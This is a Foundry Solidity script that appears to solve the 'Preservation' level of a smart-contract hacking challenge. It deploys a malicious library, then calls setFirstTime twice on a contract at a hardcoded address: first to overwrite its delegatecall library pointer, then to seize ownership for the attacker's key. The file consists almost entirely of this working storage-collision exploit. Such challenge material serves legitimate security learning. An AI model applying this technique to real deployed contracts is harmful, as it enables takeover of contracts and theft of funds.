import {Script, console} from "forge-std/Script.sol";
import "./attacks/16_PreservationAttack.sol";

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationScript is Script {
    address public dead;
    address public beef;
    address public owner;

    IPreservation preservation = IPreservation(0x02047c75AB5c3c3151281e2057Ac458b16F3868e);

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        PoopyLibrary bomb = new PoopyLibrary();
        preservation.setFirstTime(uint256(uint160(address(bomb))));
        preservation.setFirstTime(uint256(uint160(vm.addr(privateKey))));
        vm.stopBroadcast();
    }
}
